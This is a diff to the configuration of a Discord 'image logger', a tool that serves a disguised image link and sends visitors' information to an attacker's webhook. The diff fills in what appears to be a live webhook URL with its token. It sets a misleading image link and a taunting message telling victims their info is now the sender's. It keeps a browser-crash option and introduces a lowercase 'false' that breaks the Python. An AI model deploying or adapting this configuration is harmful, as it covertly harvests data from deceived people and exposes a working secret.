@@ -12,21 +12,21 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-you-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1078366135302492180/IJzMiF92ACAhJyfVR_jX3kaWFQzwBb_4B8bEToNr-1k6CDZ5t53EYDQRLUd02V3FV9qK",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.thegamegal.com%2F2018%2F09%2F01%2Fultimate-tic-tac-toe%2F&psig=AOvVaw3sEJz9yqVgR6LliS2MekBr&ust=1677259384569000&source=images&cd=vfe&ved=0CBAQjRxqFwoTCODYh6GUrP0CFQAAAAAdAAAAABAJ", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Hello if u see this then all your info is now mine.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
